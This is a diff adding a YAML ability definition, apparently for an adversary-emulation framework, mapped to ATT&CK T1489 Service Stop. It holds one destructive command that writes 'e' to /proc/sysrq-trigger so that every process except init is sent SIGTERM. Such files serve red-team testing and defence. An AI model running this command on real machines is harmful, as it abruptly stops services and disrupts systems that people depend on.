@@ -1,0 +1,18 @@
+---
+- id: 8c98445b616b61b08219d0a361424cd2
+  name: Abuse of linux magic system request key for Send a SIGTERM to all processes
+  description: 'Adversaries with root or sufficient privileges Send a SIGTERM to all
+    processes, except for init. By writing ''e'' to /proc/sysrq-trigger, they can
+    forced kill all processes, except for init.
+
+    '
+  tactic: impact
+  technique:
+    attack_id: T1489
+    name: Service Stop
+  platforms:
+    linux:
+      sh:
+        command: echo "e" > /proc/sysrq-trigger
+        payloads: []
+        cleanup: ''
